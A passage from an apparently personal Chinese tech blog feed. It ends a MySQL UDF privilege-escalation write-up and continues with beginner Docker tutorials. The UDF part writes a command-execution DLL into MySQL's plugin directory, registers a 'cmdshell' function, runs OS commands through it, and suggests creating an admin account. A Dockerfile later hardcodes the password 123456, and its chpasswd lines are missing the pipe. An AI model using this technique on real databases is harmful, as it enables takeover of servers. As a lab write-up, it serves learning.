&#x27;xxx&#x27; into outfile &#x27;D:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;D:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre></td></tr></table></figure><p>但是很遗憾...我尝试了几次发现都是失败的.... <img src="/images/2018/02/sql_6.png" alt="blacsheep" /> 有人说是mysql更新之后导致的...具体原因我也不清楚... 思考了一下觉得,可以写的话那就写个webshell进去,有权限的话直接创建一个plugin文件夹就ok了,具体的就不看了...本地实验我就直接右键创建了(菜鸡捂脸ing) 创建之后写个sql导入dll</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;D:\\python2\\Lib\\site-packages\\sqlmap\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_&quot;) into outfile &quot;D:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>最蛋疼的部分来了... 创建这里疯狂出问题... 后来网上找了个脚本才知道是dll文件的问题... 脚本放一下 <a href="/images/2018/07/udf_Ti_Quan.zip">udf提权</a> 弄好了dll文件后面就简单了... 数据库自选..</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use udf;</span><br><span class="line">create function cmdshell returns string soname &#x27;moonudf.dll&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/images/2018/02/提权.png" alt="blacsheep" /> 然后就可以为所欲为了... 这里我把减号删掉了....</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select cmdshell(&#x27;dir&#x27;);</span><br><span class="line">++</span><br><span class="line"> cmdshell(&#x27;dir&#x27;) </span><br><span class="line">++</span><br><span class="line">  驱动器 D 中的卷是 软件</span><br><span class="line"> 卷的序列号是 A622-E827</span><br><span class="line"></span><br><span class="line"> D:\phpStudy\MySQL\data 的目录</span><br><span class="line"></span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          .</span><br><span class="line">2018/02/09  16:06    &lt;DIR&gt;          ..</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          challenges</span><br><span class="line">2018/02/02  17:49               669 DESKTOP-76O3SAJ.err</span><br><span class="line">2018/02/09  15:15                 5 DESKTOP-76O3SAJ.pid</span><br><span class="line">2017/11/27  01:06    &lt;DIR&gt;          flappy</span><br><span class="line">2017/12/02  14:13    &lt;DIR&gt;          friends</span><br><span class="line">2018/02/02  17:30        18,874,368 ibdata1</span><br><span class="line">2018/02/09  15:15        25,165,824 ib_logfile0</span><br><span class="line">2017/07/12  21:48        25,165,824 ib_logfile1</span><br><span class="line">2017/11/29  03:42    &lt;DIR&gt;          mctf_empty</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          mysql</span><br><span class="line">2017/11/25  17:46    &lt;DIR&gt;          my_db</span><br><span class="line">2017/07/12  21:48    &lt;DIR&gt;          performance_schema</span><br><span class="line">2017/12/26  02:08    &lt;DIR&gt;          security</span><br><span class="line">2018/02/09  16:34    &lt;DIR&gt;          udf</span><br><span class="line">2017/11/08  18:41    &lt;DIR&gt;          ultrax</span><br><span class="line">               5 个文件     69,206,690 字节</span><br><span class="line">              12 个目录 192,709,541,888 可用字节</span><br><span class="line"></span><br><span class="line">--------------------------------------------完成!</span><br><span class="line">                                                   </span><br><span class="line">++</span><br><span class="line">1 row in set (4.84 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>剩下的创建管理员什么的自己创建就好了~ 对了,最后别忘了drop function cmdshell;</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker新手入门(4)之容器连接</title>
      <link href="/2018/01/29/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A84%E4%B9%8B%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/"/>
      <url>/2018/01/29/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A84%E4%B9%8B%E5%AE%B9%E5%99%A8%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>前面写过怎么通过后台运行一个docker的web应用并且本机通过特定端口访问,这一部分讲的大概就是这一块的内容了</p><h3 id="网络端口映射">网络端口映射</h3><p>创建一个python应用的容器,还是和以前一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P training/webapp python app.py</span><br><span class="line">0a4a54a161ad6226681a03d708a40003cdac29217c8d181a5d7c868dcfcc4a87</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">0a4a54a161ad        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 4 seconds        0.0.0.0:32768-&gt;5000/tcp   objective_curie</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>-P指的是使用docker指定的端口 当然我们也可以自定义端口,使用-p 主机端口:容器端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line">e25b18467f580af41abd52eae2710f999b7f3b901d9be932af09c96aede5a706</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e25b18467f58        training/webapp     &quot;python app.py&quot;     4 seconds ago       Up 3 seconds        0.0.0.0:5000-&gt;5000/tcp   suspicious_hermann</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>如果使用udp的话,可以在端口后面加上/udp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -p 5000:5000/udp training/webapp python app.py</span><br><span class="line">a2c1428b1ebb5559396ba4ee6c859d881a3f5c1da3b77d00f01b0ad1ed43cee9</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                              NAMES</span><br><span class="line">a2c1428b1ebb        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 4 seconds        5000/tcp, 0.0.0.0:5000-&gt;5000/udp   tender_shaw</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>docker port可以帮我们查看端口绑定的情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker port a2c1428b1ebb</span><br><span class="line">5000/udp -&gt; 0.0.0.0:5000</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="docker容器连接">docker容器连接</h3><p>端口映射不是唯一的连接的方法...</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker有一个连接系统允许将多个容器连接在一起，共享连接信息。</span><br><span class="line"></span><br><span class="line">docker连接会创建一个父子关系，其中父容器可以看到子容器的信息。</span><br></pre></td></tr></table></figure><p>这里还不大看得懂...慢慢学吧...</p><h3 id="容器命名">容器命名</h3><p>通过--name来标识容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -d -P --name blacsheep training/webapp python app.py</span><br><span class="line">17799882b9dd0d255b1ca62f5c9b0a45e0d35d277427271e1d6a17b762246e94</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">17799882b9dd        training/webapp     &quot;python app.py&quot;     6 seconds ago       Up 6 seconds        0.0.0.0:32769-&gt;5000/tcp   blacsheep</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep#</span><br></pre></td></tr></table></figure><p>okok要出门了....回来继续写...</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker新手入门(3)之镜像使用</title>
      <link href="/2018/01/28/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A83%E4%B9%8B%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/01/28/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A83%E4%B9%8B%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>运行容器的时候如果镜像本地不存在,docker就会从docker镜像仓库里面去下载,默认docker hub公共镜像源 这一篇主要是怎么管理使用本地镜像以及创建镜像</p><h3 id="列出镜像列表">列出镜像列表</h3><p>命令:docker images</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>其中 repository:镜像的仓库源 tag:镜像的标签 image id:镜像id created:创建时间 size:大小 一个仓库源可以有多个tag,比如一个ubuntu的仓库源里面可以有14.04,15.10等等版本,我们可以用repository:tag来定义不同的镜像,比如我们要用16.10的ubuntu来运行容器的时候,就是使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i ubuntu:16.10 /bin/bash </span><br><span class="line">root@68cc92ce5dee:/# </span><br></pre></td></tr></table></figure><p>如果不去指定镜像的标签的话,比如只用ubuntu,docker就会默认使用ubuntu:latest的镜像</p><h3 id="获取镜像">获取镜像</h3><p>使用docker pull,同时说明不带标签的话使用的是latest的标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">1be7f2b886e8: Pull complete </span><br><span class="line">6fbc4a21b806: Pull complete </span><br><span class="line">c71a6f8e1378: Pull complete </span><br><span class="line">4be3072e5a37: Pull complete </span><br><span class="line">06c6d2f59700: Pull complete </span><br><span class="line">Digest: sha256:e46251ecd3548065ca203df31bdcf25e53b530b9b39bd3a86ac8147b347bb7ac</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>下载完成之后docker images查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago          112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><h3 id="查找镜像">查找镜像</h3><p>可以从docker hub的网站来搜索镜像,网址为https://hub.docker.com/ 如果想用命令行,可以用docker search xxx,比如我们想找一个httpd的镜像作为web服务,可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker search httpd</span><br><span class="line">NAME                                DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">httpd                               The Apache HTTP Server Project                  1470                [OK]                </span><br><span class="line">hypriot/rpi-busybox-httpd           Raspberry Pi compatible Docker Image with a …   40                                      </span><br><span class="line">centos/httpd                                                                        15                                      [OK]</span><br><span class="line">centos/httpd-24-centos7             Platform for running Apache httpd 2.4 or bui…   8                                       </span><br><span class="line">armhf/httpd                         The Apache HTTP Server Project                  8                                       </span><br><span class="line">macadmins/netboot-httpd             use in combination with bruienne/bsdpy          4                                       [OK]</span><br><span class="line">lolhens/httpd                       Apache httpd 2 Server                           2                                       [OK]</span><br><span class="line">salim1983hoop/httpd24               Dockerfile running apache config                2                                       [OK]</span><br><span class="line">fboaventura/dckr-httpd              Small footprint http server to use with othe…   1                                       [OK]</span><br><span class="line">rgielen/httpd-image-simple          Docker image for simple Apache httpd based o…   1                                       [OK]</span><br><span class="line">lead4good/httpd-fpm                 httpd server which connects via fcgi proxy h…   1                                       [OK]</span><br><span class="line">epflidevelop/os-wp-httpd            WP httpd                                        1                                       [OK]</span><br><span class="line">rgielen/httpd-image-php5            Docker image for Apache httpd with PHP 5 bas…   1                                       [OK]</span><br><span class="line">publici/httpd                       httpd:latest                                    0                                       [OK]</span><br><span class="line">tplatform/aws-linux-httpd24-php70   aws-linux-httpd24-php70                         0                                       [OK]</span><br><span class="line">dockerpinata/httpd                                                                  0                                       </span><br><span class="line">trollin/httpd                                                                       0                                       </span><br><span class="line">manasip/httpd                                                                       0                                       </span><br><span class="line">manageiq/httpd                      Container with httpd, built on CentOS for Ma…   0                                       [OK]</span><br><span class="line">jbpt/httpd                                                                          0                                       [OK]</span><br><span class="line">fintaffy/fintaffy-httpd                                                             0                                       </span><br><span class="line">efrecon/httpd                       A micro-sized httpd. Start serving files in …   0                                       [OK]</span><br><span class="line">ppc64le/httpd                       The Apache HTTP Server Project                  0                                       </span><br><span class="line">sbutler/pie-httpd                   PIE httpd server                                0                                       </span><br><span class="line">camptocamp/os-wp-httpd              Wordpress httpd                                 0                                       [OK]</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>name:表示镜像仓库源的名称 description:镜像描述 official:是否是docker官方发布的</p><h3 id="托取镜像">托取镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker pull httpd</span><br><span class="line"></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/httpd</span><br><span class="line">f49cf87b52c1: Pull complete </span><br><span class="line">02ca099fb6cd: Pull complete </span><br><span class="line">de7acb18da57: Pull complete </span><br><span class="line">770c8edb393d: Pull complete </span><br><span class="line">0e252730aeae: Pull complete </span><br><span class="line">6288e83d58fa: Pull complete </span><br><span class="line">a91ad03b2178: Pull complete </span><br><span class="line">Digest: sha256:6261d80fe154a7d7f1cbb0ca90eb344fafb4511afd06ebfc2d41915367ce25ad</span><br><span class="line">Status: Downloaded newer image for httpd:latest</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>之后docker run httpd就可以了</p><h3 id="创建镜像重点">创建镜像(重点)</h3><p>如果我们从docker镜像仓库里面下载的镜像不能满足我们的需求的话,有两种方式可以对镜像进行更改 - 1.从已经创建的容器中更新镜像,并且提交这个镜像 - 2.使用docker file来创建一个新的镜像</p><h5 id="更新镜像">更新镜像</h5><p>更新之前先用镜像创建一个容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i ubuntu:16.10 /bin/bashroot@000b42c94ddd:/#</span><br></pre></td></tr></table></figure><p>容器内使用apt-get update更新一下 完成之后exit退出 这个容器是按我们的需求修改的容器,可以使用docker commit来提交容器副本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker commit -m=&quot;update ubuntu&quot; -a=&quot;blacsheep&quot; 000b42c94ddd blacsheep/ubuntu:v1</span><br><span class="line">sha256:3846343d3b39a77b3dbadb32cdef5a3669560bbb96d52d639f24cc06f8d2655e</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>-m:提交的描述 -a:镜像作者 000b42c94ddd:容器id blacsheep/ubuntu:v1:镜像名:标签 然后docker images查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        About a minute ago   107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago           179MB</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago         107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago          349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>这样就可以使用新的镜像来创建容器了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -t -i blacsheep/ubuntu:v1 /bin/bash</span><br><span class="line">root@02b45e36003d:/#</span><br></pre></td></tr></table></figure><h5 id="dockerfile创建镜像">dockerfile创建镜像</h5><p>使用docker build可以从零开始创建一个镜像。但是我们必须创建一个Dockerfile来告诉docker怎么来创建我们的镜像 dockerfile自己写 写完了大概就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# cat Dockerfile</span><br><span class="line">From ubuntu:16.04</span><br><span class="line">RUN /bin/echo &#x27;root:123456&#x27; chpasswd</span><br><span class="line">RUN useradd blacsheep</span><br><span class="line">RUN /bin/echo &#x27;blacsheep:123456&#x27; chpasswd</span><br><span class="line">RUN /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line">EXPOSE 22</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><p>From:表示使用哪个镜像源 RUN:表示告诉docker在镜像里面执行什么命令 然后使用docker build -t xxx .来创建 注意,不要忘记指令最后的一个点,点表示dockerfile在当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker build -t blacsheep/ubuntu:dockerfile .</span><br><span class="line">ERRO[0036] Can&#x27;t add file /home/blacsheep/.gnupg/S.gpg-agent to tar: archive/tar: sockets not supported </span><br><span class="line">Sending build context to Docker daemon   2.19GB</span><br><span class="line">Step 1/8 : From ubuntu:16.04</span><br><span class="line">16.04: Pulling from library/ubuntu</span><br><span class="line">1be7f2b886e8: Already exists </span><br><span class="line">6fbc4a21b806: Already exists </span><br><span class="line">c71a6f8e1378: Already exists </span><br><span class="line">4be3072e5a37: Already exists </span><br><span class="line">06c6d2f59700: Already exists </span><br><span class="line">Digest: sha256:2b80e7fbfd1b0a3784dd0e55fb6f2750ebc33e596c2ccee5201ecf018ac5ae05</span><br><span class="line">Status: Downloaded newer image for ubuntu:16.04</span><br><span class="line"> ---&gt; 0458a4468cbc</span><br><span class="line">Step 2/8 : RUN /bin/echo &#x27;root:123456&#x27; chpasswd</span><br><span class="line"> ---&gt; Running in b3d12aa12f6c</span><br><span class="line">Removing intermediate container b3d12aa12f6c</span><br><span class="line"> ---&gt; 99c6e9ccdd81</span><br><span class="line">Step 3/8 : RUN useradd blacsheep</span><br><span class="line"> ---&gt; Running in fe025de84d56</span><br><span class="line">Removing intermediate container fe025de84d56</span><br><span class="line"> ---&gt; e5180f2047b3</span><br><span class="line">Step 4/8 : RUN /bin/echo &#x27;blacsheep:123456&#x27; chpasswd</span><br><span class="line"> ---&gt; Running in aa3c30d8f07b</span><br><span class="line">Removing intermediate container aa3c30d8f07b</span><br><span class="line"> ---&gt; 9bda89fa8c14</span><br><span class="line">Step 5/8 : RUN /bin/echo -e &quot;LANG=\&quot;en_US.UTF-8\&quot;&quot; &gt;/etc/default/local</span><br><span class="line"> ---&gt; Running in d63a51e6d430</span><br><span class="line">Removing intermediate container d63a51e6d430</span><br><span class="line"> ---&gt; a3b879d7090e</span><br><span class="line">Step 6/8 : EXPOSE 22</span><br><span class="line"> ---&gt; Running in d2f15040553b</span><br><span class="line">Removing intermediate container d2f15040553b</span><br><span class="line"> ---&gt; 65916c8dda3e</span><br><span class="line">Step 7/8 : EXPOSE 80</span><br><span class="line"> ---&gt; Running in 62dde9991ee4</span><br><span class="line">Removing intermediate container 62dde9991ee4</span><br><span class="line"> ---&gt; 5bf05e8d377f</span><br><span class="line">Step 8/8 : CMD /usr/sbin/sshd -D</span><br><span class="line"> ---&gt; Running in 62528b637ebc</span><br><span class="line">Removing intermediate container 62528b637ebc</span><br><span class="line"> ---&gt; 7ba34ce933fb</span><br><span class="line">Successfully built 7ba34ce933fb</span><br><span class="line">Successfully tagged blacsheep/ubuntu:dockerfile</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED              SIZE</span><br><span class="line">blacsheep/ubuntu    dockerfile          7ba34ce933fb        About a minute ago   112MB</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        22 minutes ago       107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago           179MB</span><br><span class="line">ubuntu              16.04               0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              latest              0458a4468cbc        2 days ago           112MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago         107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago          349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep#</span><br></pre></td></tr></table></figure><p>最后的docker images也可以看出镜像安装成功了 然后至于用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker run -i -t blacsheep/ubuntu:dockerfile /bin/bash</span><br><span class="line">root@1b52c348bf31:/# id blacsheep</span><br><span class="line">uid=1000(blacsheep) gid=1000(blacsheep) groups=1000(blacsheep)</span><br><span class="line">root@1b52c348bf31:/# </span><br></pre></td></tr></table></figure><h3 id="设置镜像标签">设置镜像标签</h3><p>使用docker tag命令 比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker tag 7ba34ce933fb blacsheep/ubuntu:practice</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">blacsheep/ubuntu    dockerfile          7ba34ce933fb        19 minutes ago      112MB</span><br><span class="line">blacsheep/ubuntu    practice            7ba34ce933fb        19 minutes ago      112MB</span><br><span class="line">blacsheep/ubuntu    v1                  3846343d3b39        40 minutes ago      107MB</span><br><span class="line">httpd               latest              2e202f453940        2 days ago          179MB</span><br><span class="line">ubuntu              16.10               7d3f705d307c        6 months ago        107MB</span><br><span class="line">training/webapp     latest              6fae60ef3446        2 years ago         349MB</span><br><span class="line">root@blacsheep-myubuntu:/home/blacsheep# </span><br></pre></td></tr></table></figure><p>可以看到blacsheep/ubuntu多了一个practice标签.</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker新手入门(2)之容器使用</title>
      <link href="/2018/01/27/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8B%E5%AE%B9%E5%99%A8%E4%BD%BF%E7%94%A8/"/>
      <url>/2018/01/27/docker%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E4%B9%8B%E5%AE%B9%E5%99%A8%E4%BD%BF%E7%94%A8/</url>
      
